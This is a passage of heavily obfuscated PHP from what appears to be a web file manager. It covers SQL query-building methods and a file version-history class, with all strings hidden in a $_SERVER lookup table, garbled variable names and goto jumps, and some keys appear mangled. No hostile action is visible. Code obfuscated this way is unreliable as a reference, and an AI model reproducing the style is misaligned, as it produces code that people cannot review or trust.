$¼ßÒÉô =& $_SERVER[•Ùç É]; $¤êëÃÄ÷ = $Éùè¾â… = array(); $this->model = $ŸÇéí[$¼ßÒÉô[327]]; foreach ($äß½Ì¢è as $÷¢…èßı => $¢œıïşÌ) { if (is_array($¢œıïşÌ) && $¼ßÒÉô[343] == $¢œıïşÌ[0]) { $Éùè¾â…[] = $this->parseKey($÷¢…èßı); $¤êëÃÄ÷[] = $¢œıïşÌ[1]; } elseif (is_scalar($¢œıïşÌ) || is_null($¢œıïşÌ)) { $Éùè¾â…[] = $this->parseKey($÷¢…èßı); $¤êëÃÄ÷[] = $this->parseValue($¢œıïşÌ); } } $Õ÷«é¢Ë = ($ãøä°èí ? $¼ßÒÉô[958] : $¼ßÒÉô[959]) . $¼ßÒÉô[960] . $this->parseTable($ŸÇéí[$¼ßÒÉô[325]]) . $¼ßÒÉô[954] . implode($¼ßÒÉô[50], $Éùè¾â…) . $¼ßÒÉô[955] . implode($¼ßÒÉô[50], $¤êëÃÄ÷) . $¼ßÒÉô[956]; $Õ÷«é¢Ë .= $this->parseLock(isset($ŸÇéí[$¼ßÒÉô[889]]) ? $ŸÇéí[$¼ßÒÉô[889]] : !1); $Õ÷«é¢Ë .= $this->parseComment(!empty($ŸÇéí[$¼ßÒÉô[400]]) ? $ŸÇéí[$¼ßÒÉô[400]] : $¼ßÒÉô[12]); return $this->execute($Õ÷«é¢Ë, $this->parseBind(!empty($ŸÇéí[$¼ßÒÉô[331]]) ? $ŸÇéí[$¼ßÒÉô[331]] : array())); } public function selectInsert($å Ø·“, $ÕÅ«ˆç², $«ÔáîÍ = array()) { $Ô¹¸©Ê  =& $_SERVER[•Ùç É]; $this->model = $«ÔáîÍ[$Ô¹¸©Ê [327]]; if (is_string($å Ø·“)) { $å Ø·“ = explode($Ô¹¸©Ê [50], $å Ø·“); } array_walk($å Ø·“, array($this, $Ô¹¸©Ê [957])); $Ì‚îâ·· = $Ô¹¸©Ê [1091] . $this->parseTable($ÕÅ«ˆç²) . $Ô¹¸©Ê [954] . implode($Ô¹¸©Ê [50], $å Ø·“) . $Ô¹¸©Ê [1069]; $Ì‚îâ·· .= $this->buildSelectSql($«ÔáîÍ); return $this->execute($Ì‚îâ··, $this->parseBind(!empty($«ÔáîÍ[$Ô¹¸©Ê [331]]) ? $«ÔáîÍ[$Ô¹¸©Ê [331]] : array())); } public function update($Í³ş¥È, $à‘‹Ğáº) { $¬¡„«¾Ê =& $_SERVER[•Ùç É]; $this->model = $à‘‹Ğáº[$¬¡„«¾Ê[327]]; $Ô¤×»­Œ = $¬¡„«¾Ê[1092] . $this->parseTable($à‘‹Ğáº[$¬¡„«¾Ê[325]]) . $this->parseSet($Í³ş¥È) . $this->parseWhere(!empty($à‘‹Ğáº[$¬¡„«¾Ê[321]]) ? $à‘‹Ğáº[$¬¡„«¾Ê[321]] : $¬¡„«¾Ê[12]) . $this->parseOrder(!empty($à‘‹Ğáº[$¬¡„«¾Ê[411]]) ? $à‘‹Ğáº[$¬¡„«¾Ê[411]] : $¬¡„«¾Ê[12]) . $this->parseLimit(!empty($à‘‹Ğáº[$¬¡„«¾Ê[338]]) ? $à‘‹Ğáº[$¬¡„«¾Ê[338]] : $¬¡„«¾Ê[12]) . $this->parseLock(isset($à‘‹Ğáº[$¬¡„«¾Ê[889]]) ? $à‘‹Ğáº[$¬¡„«¾Ê[889]] : !1) . $this->parseComment(!empty($à‘‹Ğáº[$¬¡„«¾Ê[400]]) ? $à‘‹Ğáº[$¬¡„«¾Ê[400]] : $¬¡„«¾Ê[12]); return $this->execute($Ô¤×»­Œ, $this->parseBind(!empty($à‘‹Ğáº[$¬¡„«¾Ê[331]]) ? $à‘‹Ğáº[$¬¡„«¾Ê[331]] : array())); } public function delete($Çì«ñïà = array()) { $ğğåŸà =& $_SERVER[•Ùç É]; $this->model = $Çì«ñïà[$ğğåŸà[327]]; $‹ÄÇ–È = $ğğåŸà[1093] . $this->parseTable($Çì«ñïà[$ğğåŸà[325]]) . $this->parseWhere(!empty($Çì«ñïà[$ğğåŸà[321]]) ? $Çì«ñïà[$ğğåŸà[321]] : $ğğåŸà[12]) . $this->parseOrder(!empty($Çì«ñïà[$ğğåŸà[411]]) ? $Çì«ñïà[$ğğåŸà[411]] : $ğğåŸà[12]) . $this->parseLimit(!empty($Çì«ñïà[$ğğåŸà[338]]) ? $Çì«ñïà[$ğğåŸà[338]] : $ğğåŸà[12]) . $this->parseLock(isset($Çì«ñïà[$ğğåŸà[889]]) ? $Çì«ñïà[$ğğåŸà[889]] : !1) . $this->parseComment(!empty($Çì«ñïà[$ğğåŸà[400]]) ? $Çì«ñïà[$ğğåŸà[400]] : $ğğåŸà[12]); return $this->execute($‹ÄÇ–È, $this->parseBind(!empty($Çì«ñïà[$ğğåŸà[331]]) ? $Çì«ñïà[$ğğåŸà[331]] : array())); } public function select($“³Â‰“– = array()) { $ÎÎ±àë =& $_SERVER[•Ùç É]; $this->model = $“³Â‰“–[$ÎÎ±àë[327]]; $÷äËûì = $this->buildSelectSql($“³Â‰“–); $ûû“üµ = isset($“³Â‰“–[$ÎÎ±àë[395]]) ? $“³Â‰“–[$ÎÎ±àë[395]] : !1; if ($ûû“üµ) { $¡É‚ÇÃê = is_string($ûû“üµ[$ÎÎ±àë[96]]) ? $ûû“üµ[$ÎÎ±àë[96]] : $ÎÎ±àë[1094] . md5($÷äËûì); $Œ¼Üƒí = think_cache($¡É‚ÇÃê, $ÎÎ±àë[12], $ûû“üµ); if (!1 !== $Œ¼Üƒí) { return $Œ¼Üƒí; } } $Ú£µãÑ¯ = $this->query($÷äËûì, $this->parseBind(!empty($“³Â‰“–[$ÎÎ±àë[331]]) ? $“³Â‰“–[$ÎÎ±àë[331]] : array())); if ($ûû“üµ && !1 !== $Ú£µãÑ¯) { think_cache($¡É‚ÇÃê, $Ú£µãÑ¯, $ûû“üµ); } return $Ú£µãÑ¯; } public function buildSelectSql($‹ğ±ÀŞ® = array()) { $¯›çØñ² =& $_SERVER[•Ùç É]; if (isset($‹ğ±ÀŞ®[$¯›çØñ²[399]])) { if (strpos($‹ğ±ÀŞ®[$¯›çØñ²[399]], $¯›çØñ²[50])) { list($Åµ¾¯©ü, $®ãêÂöô) = explode($¯›çØñ²[50], $‹ğ±ÀŞ®[$¯›çØñ²[399]]); } else { $Åµ¾¯©ü = $‹ğ±ÀŞ®[$¯›çØñ²[399]]; } $Åµ¾¯©ü = $Åµ¾¯©ü ? $Åµ¾¯©ü : 1; $®ãêÂöô = isset($®ãêÂöô) ? $®ãêÂöô : (is_numeric($‹ğ±ÀŞ®[$¯›çØñ²[338]]) ? $‹ğ±ÀŞ®[$¯›çØñ²[338]] : 20); $ üËèúá = $®ãêÂöô * ((int) $Åµ¾¯©ü - 1); $‹ğ±ÀŞ®[$¯›çØñ²[338]] = $ üËèúá . $¯›çØñ²[50] . $®ãêÂöô; } if (think_config($¯›çØñ²[1095])) { $¼øÒ°Ò = $¯›çØñ²[1096] . md5(serialize($‹ğ±ÀŞ®)); $Š¶êğóÉ = think_cache($¼øÒ°Ò); if ($Š¶êğóÉ) { return $Š¶êğóÉ; } } $Ù•ğî› = $this->parseSql($this->selectSql, $‹ğ±ÀŞ®); $Ù•ğî› .= $this->parseLock(isset($‹ğ±ÀŞ®[$¯›çØñ²[889]]) ? $‹ğ±ÀŞ®[$¯›çØñ²[889]] : !1); if (isset($¼øÒ°Ò)) { think_cache($¼øÒ°Ò, $Ù•ğî›); } return $Ù•ğî›; } public function parseSql($§‚…Æ¦°, $èÚÒşˆ = array()) { $·òİ÷Ìş =& $_SERVER[•Ùç É]; $§‚…Æ¦° = str_replace(array($·òİ÷Ìş[1097], $·òİ÷Ìş[1098], $·òİ÷Ìş[1099], $·òİ÷Ìş[1100], $·òİ÷Ìş[1101], $·òİ÷Ìş[1102], $·òİ÷Ìş[1103], $·òİ÷Ìş[1104], $·òİ÷Ìş[1105], $·òİ÷Ìş[1106], $·òİ÷Ìş[1107]), array($this->parseTable("{$èÚÒşˆ[$·òİ÷Ìş[325]]}"), $this->parseDistinct(isset($èÚÒşˆ[$·òİ÷Ìş[1108]]) ? $èÚÒşˆ[$·òİ÷Ìş[1108]] : !1), $this->parseField(!empty($èÚÒşˆ[$·òİ÷Ìş[319]]) ? $èÚÒşˆ[$·òİ÷Ìş[319]] : $·òİ÷Ìş[205]), $this->parseJoin(!empty($èÚÒşˆ[$·òİ÷Ìş[328]]) ? $èÚÒşˆ[$·òİ÷Ìş[328]] : $·òİ÷Ìş[12]), $this->parseWhere(!empty($èÚÒşˆ[$·òİ÷Ìş[321]]) ? $èÚÒşˆ[$·òİ÷Ìş[321]] : $·òİ÷Ìş[12]), $this->parseGroup(!empty($èÚÒşˆ[$·òİ÷Ìş[549]]) ? $èÚÒşˆ[$·òİ÷Ìş[549]] : $·òİ÷Ìş[12]), $this->parseHaving(!empty($èÚÒşˆ[$·òİ÷Ìş[1109]]) ? $èÚÒşˆ[$·òİ÷Ìş[1109]] : $·òİ÷Ìş[12]), $this->parseOrder(!empty($èÚÒşˆ[$·òİ÷Ìş[411]]) ? $èÚÒşˆ[$·òİ÷Ìş[411]] : $·òİ÷Ìş[12]), $this->parseLimit(!empty($èÚÒşˆ[$·òİ÷Ìş[338]]) ? $èÚÒşˆ[$·òİ÷Ìş[338]] : $·òİ÷Ìş[12]), $this->parseUnion(!empty($èÚÒşˆ[$·òİ÷Ìş[393]]) ? $èÚÒşˆ[$·òİ÷Ìş[393]] : $·òİ÷Ìş[12]), $this->parseComment(!empty($èÚÒşˆ[$·òİ÷Ìş[400]]) ? $èÚÒşˆ[$·òİ÷Ìş[400]] : $·òİ÷Ìş[12])), $§‚…Æ¦°); return $§‚…Æ¦°; } public function getLastSql($éÚ·ó¨ñ = '') { return $éÚ·ó¨ñ ? $this->modelSql[$éÚ·ó¨ñ] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($»Ó›å¦ˆ) { return addslashes($»Ó›å¦ˆ); } public function setModel($ÀƒÙ×Õõ) { $this->model = $ÀƒÙ×Õõ; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } goto DğåˆËæøÈ; bƒ¦¾ŠÙ‘„: class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $ê‚šÛ¾ =& $_SERVER[•Ùç É]; $¹Ïä”ÛÌ = $GLOBALS[$ê‚šÛ¾[6]][$ê‚šÛ¾[91]]; if ($¹Ïä”ÛÌ[$ê‚šÛ¾[1267]] != 1) { return; } if ($¹Ïä”ÛÌ[$ê‚šÛ¾[1268]] <= 0) { return; } if (isset($_REQUEST[$ê‚šÛ¾[1269]]) && $_REQUEST[$ê‚šÛ¾[1269]] == $ê‚šÛ¾[90]) { return; } Hook::bind($ê‚šÛ¾[1270], $ê‚šÛ¾[1271]); Hook::bind($ê‚šÛ¾[1272], $ê‚šÛ¾[1273]); Hook::bind($ê‚šÛ¾[1274], $ê‚šÛ¾[1275]); Hook::bind($ê‚šÛ¾[1276], $ê‚šÛ¾[1277]); Hook::bind($ê‚šÛ¾[1278], $ê‚šÛ¾[1279]); Hook::bind($ê‚šÛ¾[1280], $ê‚šÛ¾[1281]); } public static function eventBeforeUpload($Øªı“øˆ) { if ($Øªı“øˆ[3] && $Øªı“øˆ[3] != REPEAT_REPLACE) { return; } $òÄË”éü = self::parsePath($Øªı“øˆ[0]); if (!$òÄË”éü) { return; } self::add($òÄË”éü); } public static function eventBeforeEdit($ö×§ÕÔÂ) { $ÌüéšÍŸ = self::parsePath($ö×§ÕÔÂ[0]); if (!$ÌüéšÍŸ) { return; } self::add($ÌüéšÍŸ); } public static function eventBeforeCopyFile($ıÒÕçĞ, $·à’é«Á, $’ò‰´ş¶, $ûâ„ä†, $³¬ıó©À, $Ê½ü²ü—) { $×”•ğ±ú =& $_SERVER[•Ùç É]; if (isset($’ò‰´ş¶->_data[$×”•ğ±ú[1206]]) && $’ò‰´ş¶->_data[$×”•ğ±ú[1206]]) { return; } $ò¿…ŸÒ = $’ò‰´ş¶->getPathOuter($ûâ„ä†); $×¾ªü©° = self::parsePath($ò¿…ŸÒ); if (!$×¾ªü©°) { return; } self::add($×¾ªü©°); } public static function eventBeforeRename($±“ÜõèŸ) { $ùş“‘ÏÜ =& $_SERVER[•Ùç É]; $¹‘ğâÕ÷ = self::parsePath($±“ÜõèŸ[0]); if (!$¹‘ğâÕ÷) { return; } $æ°çı¦û = self::checkInHistory($¹‘ğâÕ÷); if (!$æ°çı¦û) { return; } if ($æ°çı¦û[$ùş“‘ÏÜ[33]] == $ùş“‘ÏÜ[216]) { $¸½œÚ”Ö = self::listData($¹‘ğâÕ÷); if ($¸½œÚ”Ö && $¸½œÚ”Ö[$ùş“‘ÏÜ[415]]) { self::moveHistory($¹‘ğâÕ÷, $±“ÜõèŸ[1]); } } else { IO::rename($æ°çı¦û[$ùş“‘ÏÜ[86]], $±“ÜõèŸ[1]); } } public static function eventBeforeMove($’»¾Ü¿²) { $ñ§§é´Ï =& $_SERVER[•Ùç É]; $âş¿¼ = self::parsePath($’»¾Ü¿²[0]); if (!$âş¿¼) { return; } $‚ª˜×îƒ = self::parsePath($’»¾Ü¿²[1]); if (!$‚ª˜×îƒ) { return; } $æ¯´¡Ú = $’»¾Ü¿²[3]; $‰ ÙÒü¶ = self::checkInHistory($âş¿¼); if (!$‰ ÙÒü¶) { return; } $“ô–ü« = self::pathHistory($‚ª˜×îƒ); if ($‰ ÙÒü¶[$ñ§§é´Ï[33]] == $ñ§§é´Ï[216]) { $ñ´€ÁÛõ = self::listData($âş¿¼); $şÒ›ì†¯ = rtrim($‚ª˜×îƒ, $ñ§§é´Ï[8]) . $ñ§§é´Ï[8] . ($æ¯´¡Ú ? $æ¯´¡Ú : get_path_this($âş¿¼)); $ğÆù˜Ï¼ = self::listData($şÒ›ì†¯); if ($ñ´€ÁÛõ && $ñ´€ÁÛõ[$ñ§§é´Ï[415]] && $ğÆù˜Ï¼ && $ğÆù˜Ï¼[$ñ§§é´Ï[415]]) { return self::clear($âş¿¼); } if ($ñ´€ÁÛõ && $ñ´€ÁÛõ[$ñ§§é´Ï[415]]) { self::moveHistory($âş¿¼, $æ¯´¡Ú, $“ô–ü«); } } else { IO::move($‰ ÙÒü¶[$ñ§§é´Ï[86]], $“ô–ü«, !1, $æ¯´¡Ú); self::clearEmptyFolder(IO::pathFather($‰ ÙÒü¶[$ñ§§é´Ï[86]])); } } public static function eventAfterRemove($›àï—Ú, $ï®ôŒĞé) { $áâ¡ùÑ› =& $_SERVER[•Ùç É]; if (!$ï®ôŒĞé) { return; } $ÏÆ±ıª‰ = self::parsePath($›àï—Ú[0]); if (!$ÏÆ±ıª‰) { return; } $³‚æõˆ• = self::checkInHistory($ÏÆ±ıª‰); if (!$³‚æõˆ•) { return; } if ($³‚æõˆ•[$áâ¡ùÑ›[33]] == $áâ¡ùÑ›[216]) { $®¥ş²‘¾ = self::listData($ÏÆ±ıª‰, !1); if ($®¥ş²‘¾ && $®¥ş²‘¾[$áâ¡ùÑ›[415]]) { self::clear($ÏÆ±ıª‰, !1); } } else { IO::remove($³‚æõˆ•[$áâ¡ùÑ›[86]]); self::clearEmptyFolder(IO::pathFather($³‚æõˆ•[$áâ¡ùÑ›[86]])); } } private static function checkInHistory($ƒ‡Ü¤Ø) { $†¤Œ±Œ = self::pathHistory($ƒ‡Ü¤Ø); if (!IO::exist($†¤Œ±Œ)) { $†¤Œ±Œ .= $_SERVER[•Ùç É][1282]; } return IO::exist($†¤Œ±Œ) ? IO::info($†¤Œ±Œ) : !1; } private static function parsePath($ÕıŞ¢Šà) { $«€çáÉô =& $_SERVER[•Ùç É]; if (!$ÕıŞ¢Šà) { return !1; } if ($GLOBALS[$«€çáÉô[1283]]) { return; } $ö¥ëíÅù = KodIO::parse($ÕıŞ¢Šà); $Šª¦Œ»— = $ö¥ëíÅù[$«€çáÉô[33]]; $¡¿‘ß²© = !$Šª¦Œ»— || $Šª¦Œ»— == KodIO::KOD_IO || $Šª¦Œ»— == KodIO::KOD_SHARE_ITEM; if (!$¡¿‘ß²© || !$ö¥ëíÅù[$«€çáÉô[1284]]) { return !1; } if (substr($ÕıŞ¢Šà, 0, strlen(DATA_PATH . $«€çáÉô[1285])) == DATA_PATH . $«€çáÉô[1285]) { return !1; } if ($Šª¦Œ»— == KodIO::KOD_SHARE_ITEM) { $±§Ç˜¡ä = IO::init($ÕıŞ¢Šà); if ($±§Ç˜¡ä->pathParse[$«€çáÉô[1202]]) { return self::parsePath($±§Ç˜¡ä->pathParse[$«€çáÉô[1202]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $áÛÄÎş = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $«€çáÉô[1286]); foreach ($áÛÄÎş as $Í‰­ŸÍç) { if (!$Šª¦Œ»— && substr($ÕıŞ¢Šà, 0, strlen($Í‰­ŸÍç)) == $Í‰­ŸÍç) { return !1; } } self::log($GLOBALS[$«€çáÉô[1197]] . $«€çáÉô[1287] . $ÕıŞ¢Šà); return $ÕıŞ¢Šà; } private static function pathHistory($™Ø‚í›) { $ÂÕíöÜÁ =& $_SERVER[•Ùç É]; $¤ÑÇÏíÍ = self::$_historyBase . ltrim(KodIO::clear($™Ø‚í›), $ÂÕíöÜÁ[8]); $¤ÑÇÏíÍ = str_replace(array($ÂÕíöÜÁ[1288]), array($ÂÕíöÜÁ[1289]), $¤ÑÇÏíÍ); return $¤ÑÇÏíÍ; } public static function log($Š×ç¤ §) { } public static function historyCount($æ¡§ÕÅ) { $ÁÄÓüúâ =& $_SERVER[•Ùç É]; $Ìİ¿ÔÚõ = array(); $‡ûãÇñô = array(); foreach ($æ¡§ÕÅ as $“úàœ¸‘) { $¡ıç”´¼ = get_path_father($“úàœ¸‘); if (!$‡ûãÇñô[$¡ıç”´¼]) { $‡ûãÇñô[$¡ıç”´¼] = array(); } $‡ûãÇñô[$¡ıç”´¼][] = get_path_this($“úàœ¸‘); } foreach ($‡ûãÇñô as $¡ıç”´¼ => $ÀÌä°€—) { $¯Ø»‘Å• = self::parsePath($¡ıç”´¼); if (!$¯Ø»‘Å•) { continue; } foreach ($ÀÌä°€— as $’ÙÎíÑŸ) { $×¦Ø‡Ø½ = self::listData(rtrim($¯Ø»‘Å•, $ÁÄÓüúâ[8]) . $ÁÄÓüúâ[8] . $’ÙÎíÑŸ, !1); if ($×¦Ø‡Ø½ && $×¦Ø‡Ø½[$ÁÄÓüúâ[415]]) { $Ìİ¿ÔÚõ[rtrim($¡ıç”´¼, $ÁÄÓüúâ[8]) . $ÁÄÓüúâ[8] . $’ÙÎíÑŸ] = count($×¦Ø‡Ø½[$ÁÄÓüúâ[415]]); } } } return $Ìİ¿ÔÚõ; } public static function add($ƒùì­í¼) { $®ü¿Çí‡ =& $_SERVER[•Ùç É]; $à…¤Şò = self::listData($ƒùì­í¼); if (!$à…¤Şò) { return; } $ŞÆùò·ı = Model($®ü¿Çí‡[815])->get($®ü¿Çí‡[1290]); $ãğ›ÖÛÆ = intval($GLOBALS[$®ü¿Çí‡[6]][$®ü¿Çí‡[91]][$®ü¿Çí‡[1268]]); $ß°Äë™ï = $ŞÆùò·ı == $®ü¿Çí‡[1291] ? min(5, $ãğ›ÖÛÆ) : $ãğ›ÖÛÆ; if ($ãğ›ÖÛÆ <= 0) { return; } $ÓÛ‰Ç‚ = IO::info($ƒùì­í¼); $Ş¥ĞáÇ¸ = $à…¤Şò[$®ü¿Çí‡[415]]; if ($ÓÛ‰Ç‚[$®ü¿Çí‡[78]] == 0) { return; } if ($ÓÛ‰Ç‚[$®ü¿Çí‡[78]] >= 1024 * 1024 * 500) { return !1; } $êí˜» ´ = IO::hashSimple($ƒùì­í¼); if ($Ş¥ĞáÇ¸ && $Ş¥ĞáÇ¸[0][$®ü¿Çí‡[642]] == $êí˜» ´) { return !0; } if (array_key_exists($®ü¿Çí‡[219], $ÓÛ‰Ç‚) && !$ÓÛ‰Ç‚[$®ü¿Çí‡[219]]) { return !1; } $Á¯ªÖë¿ = short_id(time()); $±ï‡¼êµ = array($®ü¿Çí‡[445] => $Á¯ªÖë¿, $®ü¿Çí‡[642] => $êí˜» ´, $®ü¿Çí‡[32] => $ÓÛ‰Ç‚[$®ü¿Çí‡[32]] . $®ü¿Çí‡[10] . date($®ü¿Çí‡[1292]) . rand_string(1), $®ü¿Çí‡[78] => $ÓÛ‰Ç‚[$®ü¿Çí‡[78]], $®ü¿Çí‡[497] => USER_ID, $®ü¿Çí‡[217] => time(), $®ü¿Çí‡[1293] => $®ü¿Çí‡[12]); IO::mkdir($à…¤Şò[$®ü¿Çí‡[1294]]); $óÖ¡öş• = IO::copy($ƒùì­í¼, $à…¤Şò[$®ü¿Çí‡[1294]], !1, $±ï‡¼êµ[$®ü¿Çí‡[32]]); if (!$óÖ¡öş•) { self::clearEmptyFolder($à…¤Şò[$®ü¿Çí‡[1294]]); return !1; } array_unshift($Ş¥ĞáÇ¸, $±ï‡¼êµ); if (count($Ş¥ĞáÇ¸) > $ß°Äë™ï) { $ùÉÕ­™Ü = array_slice($Ş¥ĞáÇ¸, $ß°Äë™ï); foreach ($ùÉÕ­™Ü as $çéâ½¡Ä) { IO::remove($à…¤Şò[$®ü¿Çí‡[1294]] . $çéâ½¡Ä[$®ü¿Çí‡[32]]); } $Ş¥ĞáÇ¸ = array_slice($Ş¥ĞáÇ¸, 0, $ß°Äë™ï); } return self::saveData($à…¤Şò[$®ü¿Çí‡[1295]], $Ş¥ĞáÇ¸); } public static function remove($ë³áóÁ‹, $·ÓÓÚ‹›) { $–ÈÁ³Áİ =& $_SERVER[•Ùç É]; $å‘×«à = self::listData($ë³áóÁ‹); $ç¤‰Ç„ = array(); if (!$å‘×«à) { return !1; } foreach ($å‘×«à[$–ÈÁ³Áİ[415]] as $ÏÚ“Íå) { if ($ÏÚ“Íå[$–ÈÁ³Áİ[445]] == $·ÓÓÚ‹›) { IO::remove($å‘×«à[$–ÈÁ³Áİ[1294]] . $ÏÚ“Íå[$–ÈÁ³Áİ[32]]); continue; } $ç¤‰Ç„[] = $ÏÚ“Íå; } return self::saveData($å‘×«à[$–ÈÁ³Áİ[1295]], $ç¤‰Ç„); } public static function clear($»Ù­Ù¼’, $¥«ÕÂÖÙ = true) { $Ã„ Öå± =& $_SERVER[•Ùç É]; $Û¹Ô»ì = self::listData($»Ù­Ù¼’, $¥«ÕÂÖÙ); if (!$Û¹Ô»ì) { return !1; } foreach ($Û¹Ô»ì[$Ã„ Öå±[415]] as $•—Ùïè€) { IO::remove($Û¹Ô»ì[$Ã„ Öå±[1294]] . $•—Ùïè€[$Ã„ Öå±[32]]); } return self::saveData($Û¹Ô»ì[$Ã„ Öå±[1295]], array()); } public static function moveHistory($µƒ§ÎŞ, $â‰»É = '', $ÛÜ¿Ê•Ì = '') { $Ü—Í Œû =& $_SERVER[•Ùç É]; $—¦ÙÖ­ = self::listData($µƒ§ÎŞ, !1); if (!$—¦ÙÖ­ || !$—¦ÙÖ­[$Ü—Í Œû[415]]) { return !1; } $­İÕ¦Å = $Ü—Í Œû[1282]; $â‰»É = $â‰»É ? $â‰»É : get_path_this($µƒ§ÎŞ); $ÛÜ¿Ê•Ì = $ÛÜ¿Ê•Ì ? $ÛÜ¿Ê•Ì : $—¦ÙÖ­[$Ü—Í Œû[1294]]; $îã”Ùˆå = substr(get_path_this($—¦ÙÖ­[$Ü—Í Œû[1295]]), 0, -strlen($­İÕ¦Å)); foreach ($—¦ÙÖ­[$Ü—Í Œû[415]] as $£Ï‘ÅÌ => $‹†ö¦Ö) { $ÅÁÜ¿ø = $â‰»É . substr($‹†ö¦Ö[$Ü—Í Œû[32]], strlen($îã”Ùˆå)); $ıéç¹İ = IO::move($—¦ÙÖ­[$Ü—Í Œû[1294]] . $‹†ö¦Ö[$Ü—Í Œû[32]], $ÛÜ¿Ê•Ì, !1, $ÅÁÜ¿ø); if ($ıéç¹İ) { $—¦ÙÖ­[$Ü—Í Œû[415]][$£Ï‘ÅÌ][$Ü—Í Œû[32]] = $ÅÁÜ¿ø; } } $—¦ÙÖ­[$Ü—Í Œû[1295]] = IO::move($—¦ÙÖ­[$Ü—Í Œû[1295]], $ÛÜ¿Ê•Ì, !1, $â‰»É . $­İÕ¦Å); self::saveData($—¦ÙÖ­[$Ü—Í Œû[1295]], $—¦ÙÖ­[$Ü—Í Œû[415]]); self::clearEmptyFolder($—¦ÙÖ­[$Ü—Í Œû[1294]]); } public static function rollback($¦ïÙúÖ¤, $æ¶ÂëÊ¡) { $èì‘ÅÙà =& $_SERVER[•Ùç É]; $¦ä¤Á’ú = self::listData($¦ïÙúÖ¤); if (!$¦ä¤Á’ú) { return; } $Å¸ÃÇÀ› = IO::info($¦ïÙúÖ¤); foreach ($¦ä¤Á’ú[$èì‘ÅÙà[415]] as $¥ÍÍÀ‚ => $Ûêèèç) { if ($Ûêèèç[$èì‘ÅÙà[445]] == $æ¶ÂëÊ¡) { self::add($¦ïÙúÖ¤); $ÇßšÅóÀ = $¦ä¤Á’ú[$èì‘ÅÙà[1294]] . $Ûêèèç[$èì‘ÅÙà[32]]; $ó‰äÄ›› = IO::copy($ÇßšÅóÀ, IO::pathFather($¦ïÙúÖ¤), REPEAT_REPLACE, $Å¸ÃÇÀ›[$èì‘ÅÙà[32]]); if ($ó‰äÄ››) { self::remove($¦ïÙúÖ¤, $æ¶ÂëÊ¡); } return $ó‰äÄ››; } } return !1; } public static function setDetail($å½ ´äı, $Ûğ¸«Ä, $”ŠÜÜ´½) { $ßÚØØªå =& $_SERVER[•Ùç É]; $Äİï« = self::listData($å½ ´äı); if (!$Äİï«) { return; } foreach ($Äİï«[$ßÚØØªå[415]] as $¬Û©“§‡ => $ÉƒÛÆ¼¹) { if ($ÉƒÛÆ¼¹[$ßÚØØªå[445]] == $Ûğ¸«Ä) { $Äİï«[$ßÚØØªå[415]][$¬Û©“§‡][$ßÚØØªå[1293]] = $”ŠÜÜ´½; self::saveData($Äİï«[$ßÚØØªå[1295]], $Äİï«[$ßÚØØªå[415]]); return !0; } } return !1; } public static function fileInfo($Õ¶¸üë‰, $Ï»õÒÈé) { $á’ğí”ø =& $_SERVER[•Ùç É]; $§˜©õ•Ä = self::listData($Õ¶¸üë‰); if (!$§˜©õ•Ä) { show_json(LNG($á’ğí”ø[107]), !1); } $ø“»‘Ø× = $á’ğí”ø[12]; foreach ($§˜©õ•Ä[$á’ğí”ø[415]] as $ÍŸÁù“ß => $©‘ØÀª) { if ($©‘ØÀª[$á’ğí”ø[445]] != $Ï»õÒÈé) { continue; } $ø“»‘Ø× = $§˜©õ•Ä[$á’ğí”ø[1294]] . $©‘ØÀª[$á’ğí”ø[32]]; break; } if (!$ø“»‘Ø×) { show_json(LNG($á’ğí”ø[107]), !1); } return IO::info($ø“»‘Ø×); } public static function fileOut($ğ°Ò™á‹, $¿ç‡üš¼, $Ô¸²™İ® = false) { $Ş¾™Ñ¥ =& $_SERVER[•Ùç É]; $ˆêòüæç = self::fileInfo($ğ°Ò™á‹, $¿ç‡üš¼); $¤°¨ĞÔÊ =& $GLOBALS[$Ş¾™Ñ¥[7]]; $Ô¸²™İ® = isset($¤°¨ĞÔÊ[$Ş¾™Ñ¥[1245]]) && $¤°¨ĞÔÊ[$Ş¾™Ñ¥[1245]] == 1; if (isset($¤°¨ĞÔÊ[$Ş¾™Ñ¥[33]]) && $¤°¨ĞÔÊ[$Ş¾™Ñ¥[33]] == $Ş¾™Ñ¥[1296]) { return IO::fileOutImage($ˆêòüæç[$Ş¾™Ñ¥[86]], $¤°¨ĞÔÊ[$Ş¾™Ñ¥[1297]]); } IO::fileOut($ˆêòüæç[$Ş¾™Ñ¥[86]], $Ô¸²™İ®, get_path_this($ğ°Ò™á‹)); } public static function listData($áŞß”ƒ‡, $¼şş€Èé = true) { $ƒÁ©Ó²ù =& $_SERVER[•Ùç É]; if ($¼şş€Èé && !IO::exist($áŞß”ƒ‡)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($áŞß”ƒ‡, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $ª¬Æè¦ı = self::pathHistory($áŞß”ƒ‡); $ø†‘ƒó = array($ƒÁ©Ó²ù[1295] => $ª¬Æè¦ı . $ƒÁ©Ó²ù[1282], $ƒÁ©Ó²ù[1294] => rtrim(get_path_father($ª¬Æè¦ı), $ƒÁ©Ó²ù[8]) . $ƒÁ©Ó²ù[8], $ƒÁ©Ó²ù[415] => array()); $Ò×Û†Ò = IO::getContent($ø†‘ƒó[$ƒÁ©Ó²ù[1295]]); if ($Ò×Û†Ò) { $©ÎåÂ¶Õ = json_decode($Ò×Û†Ò, !0); if (is_array($©ÎåÂ¶Õ)) { $ø†‘ƒó[$ƒÁ©Ó²ù[415]] = $©ÎåÂ¶Õ; } } return $ø†‘ƒó; } private static function saveData($î®æ¶, $˜ª½‹ïÚ) { $–¾¬°ó† =& $_SERVER[•Ùç É]; self::log($–¾¬°ó†[1298] . $î®æ¶ . $–¾¬°ó†[73] . count($˜ª½‹ïÚ), $–¾¬°ó†[796]); if ($˜ª½‹ïÚ) { return IO::setContent($î®æ¶, json_encode($˜ª½‹ïÚ)); } $ŸÒ“Ñ‘ù = IO::pathFather($î®æ¶); IO::remove($î®æ¶); self::clearEmptyFolder($ŸÒ“Ñ‘ù); return !0; } public static function clearEmptyFolder($Ã±ùõÓ) { $ñ€öÊÒ =& $_SERVER[•Ùç É]; if (trim($Ã±ùõÓ, $ñ€öÊÒ[8]) == trim(self::$_historyBase, 